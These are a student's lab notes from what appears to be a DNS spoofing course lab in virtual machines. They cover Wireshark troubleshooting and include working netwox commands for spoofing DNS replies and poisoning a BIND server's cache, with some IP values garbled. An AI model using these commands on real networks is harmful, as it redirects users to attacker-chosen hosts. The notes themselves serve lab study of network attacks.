

**Q:** How to setup the environment for the user machine?

There are 2 network interfaces. For the user machine, I changed the DNS server
for both interfaces.

**Q:** Why the user machine is still able to resolve "www.google.com" after
the DNS server is set to 192.168.56.101?

By doing "dig +trace www.google.com", we can see that 192.168.56.101 returns
the dns root servers:
  
    ; <<>> DiG 9.8.1-P1 <<>> +trace www.google.com
    ;; global options: +cmd
    .			504990	IN	NS	g.root-servers.net.
    .			504990	IN	NS	d.root-servers.net.
    .			504990	IN	NS	b.root-servers.net.
    .			504990	IN	NS	k.root-servers.net.
    .			504990	IN	NS	h.root-servers.net.
    .			504990	IN	NS	e.root-servers.net.
    .			504990	IN	NS	f.root-servers.net.
    .			504990	IN	NS	l.root-servers.net.
    .			504990	IN	NS	a.root-servers.net.
    .			504990	IN	NS	i.root-servers.net.
    .			504990	IN	NS	j.root-servers.net.
    .			504990	IN	NS	c.root-servers.net.
    .			504990	IN	NS	m.root-servers.net.
    ;; Received 228 bytes from 192.168.56.101#53(192.168.56.101) in 871 ms
    
    com.			172800	IN	NS	a.gtld-servers.net.
    com.			172800	IN	NS	b.gtld-servers.net.
    com.			172800	IN	NS	c.gtld-servers.net.
    com.			172800	IN	NS	d.gtld-servers.net.
    com.			172800	IN	NS	e.gtld-servers.net.
    com.			172800	IN	NS	f.gtld-servers.net.
    com.			172800	IN	NS	g.gtld-servers.net.
    com.			172800	IN	NS	h.gtld-servers.net.
    com.			172800	IN	NS	i.gtld-servers.net.
    com.			172800	IN	NS	j.gtld-servers.net.
    com.			172800	IN	NS	k.gtld-servers.net.
    com.			172800	IN	NS	l.gtld-servers.net.
    com.			172800	IN	NS	m.gtld-servers.net.
    ;; Received 492 bytes from 199.7.83.42#53(199.7.83.42) in 675 ms
    
    google.com.		172800	IN	NS	ns2.google.com.
    google.com.		172800	IN	NS	ns1.google.com.
    google.com.		172800	IN	NS	ns3.google.com.
    google.com.		172800	IN	NS	ns4.google.com.
    ;; Received 168 bytes from 192.5.6.30#53(192.5.6.30) in 159 ms
    
    www.google.com.		300	IN	A	216.58.217.68
    ;; Received 48 bytes from 216.239.34.10#53(216.239.34.10) in 29 ms


But the first DNS query captured by Wireshark goes to 199.7.83.42:

    3064	2016-05-01 20:06:21.098031	10.0.2.15	199.7.83.42	DNS	74	Standard query A www.google.com

And even if we do, the DNS query to 192.168.56.101 is still missing, and the first query is:

    3080	2016-05-01 20:16:23.670337	10.0.2.15	198.97.190.53	DNS	75	Standard query A www.example.com

198.97.190.53 is the h.root-servers.net.

**Q:** Why the DNS query to 192.168.56.101 is missing?

Modified the /etc/nsswitch.conf as follows.

    #hosts:          files mdns4_minimal [NOTFOUND=return] dns mdns4
    hosts:		files dns

Source:
http://unix.stackexchange.com/questions/28941/what-dns-servers-am-i-using

Solved. Wireshark was listening on the wrong interface. If needed, I can also disable the NAT interface:
http://superuser.com/questions/695297/disable-network-adaptor-eth0-on-debian

**Q:** It seems that the OS sends out a DNS query to each interface. Why? 

Task 2:

**Q:** When doing "ping www.example.com", Wireshark does not capture a DNS query
to the DNS server? Why?

One possibility is that there is a OS-level DNS cache. I think Windows has this.
However, this thread says that Linux does not have OS-level DNS cache:
http://unix.stackexchange.com/questions/28553/how-to-read-the-local-dns-cache-contents

Solved. See above.

**Q:** When I use the user machine to ping the DNS server, wireshark on the attacker machine cannot capture those ICMP packages. Also cannot capture DNS queries. Why?

Asked a question:
http://networkengineering.stackexchange.com/questions/30105/using-wireshark-to-capture-traffic-between-vms-on-a-third-vm

Need to select All VMs in the Promiscuous mode of the network adapter.

Now, let's try to spoof response to the user. The goal is to let the user believe that 74.125.29.147 (www.google.com) is the address of www.example.com.

http://www.cis.syr.edu/~wedu/Teaching/cis758/netw522/netwox-doc_html/tools/105.html

This is the current command I use:

    sudo netwox 105 -h "www.example.com" -H "74.5.29.147" -a "ns.example.com" -A "74.125.29.147" -f "src host 10.0.2.7"

In wireshark, I see that the spoofed answer has been sent out, but it always arrives a little bit late than the authenticate response. The spoofing works roughly once in 10 trials. **Q:** How to make the spoofed response arrive faster? DoS the DNS server? But if the DoS comes from the attacker machine, it more or less slows down the spoofing pacakge as well. So probably need another machine. It also kind of similar to use-after-free exploit.

Task 3:

We now try to spoof the DNS server. This will result in a DNS cache poisoning. We want to let the DNS server to associate Google's IP address with www.psu.edu

    sudo netwox 105 -h "www.expsu.edu" -H "74.1229.147" -a "ns.psu.edu" -A "74.125.29.147" -f "src host 10.0.2.4" -s "raw" -T 600

It works. On the user machine, open Firefox and type in www.psu.edu, we saw the 404 page of Google. We further use rndc to verify that the cache is indeed poisoned:

    sudo rndc dumpdb -cache
    sudo cat /var/cache/bind/dump.db
